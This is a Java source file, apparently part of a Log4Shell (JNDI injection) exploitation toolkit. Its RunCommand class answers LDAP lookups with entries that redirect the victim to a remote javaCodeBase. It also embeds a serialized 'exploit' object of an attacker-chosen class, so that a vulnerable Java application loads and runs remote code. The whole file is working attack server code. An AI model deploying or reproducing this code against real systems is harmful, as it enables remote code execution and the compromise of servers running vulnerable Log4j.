package log4shell;

import com.unboundid.ldap.sdk.DN;
import com.unboundid.ldap.sdk.Entry;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public final class RunCommand extends Command {
  private final String codebase;
  private final String className;

  public RunCommand(DN dn, String codebase, String className) {
    super(dn);
    this.codebase = codebase;
    this.className = className;
  }

  @Override
  public Entry response() {
    System.out.printf(
        "Send LDAP entry for DN «%s» redirecting to code base «%s»%n", getDn(), codebase);

    Entry entry = new Entry(getDn());
    entry.addAttribute("objectClass", "top");
    entry.addAttribute("objectClass", "javaContainer");
    entry.addAttribute("objectClass", "javaObject");
    entry.setAttribute("javaCodeBase", codebase);

    serializedObject(entry);

    return entry;
  }

  private void namingReference(Entry entry) {
    entry.addAttribute("objectClass", "javaNamingReference");
    entry.setAttribute("javaClassName", "java.lang.String");
    entry.setAttribute("javaFactory", className);
  }

  private void serializedObject(Entry entry) {
    entry.addAttribute("objectClass", "javaSerializedObject");

    try {
      Object exploit = newExploitInstance();
      byte[] data = IO.serialize(exploit);

      entry.setAttribute("javaClassName", className);
      entry.setAttribute("javaSerializedData", data);
      entry.setAttribute("javaCodebase", codebase);

    } catch (Exception e) {
      e.printStackTrace();
      entry.setAttribute("javaClassName", "java.lang.String");
      entry.setAttribute("javaSerializedData", IO.EMPTY_STRING);
    }
  }

  private Object newExploitInstance()
      throws ClassNotFoundException, InstantiationException, IllegalAccessException {
    Class<?> klass = Class.forName(className);
    try {
      Constructor<?> constructor = klass.getConstructor(DN.class);
      return constructor.newInstance(getDn().getParent());
    } catch (NoSuchMethodException
        | SecurityException
        | InvocationTargetException
        | IllegalAccessException e) {
      return klass.newInstance();
    } catch (InstantiationException e) {
      e.printStackTrace();
      return klass.newInstance();
    }
  }
}
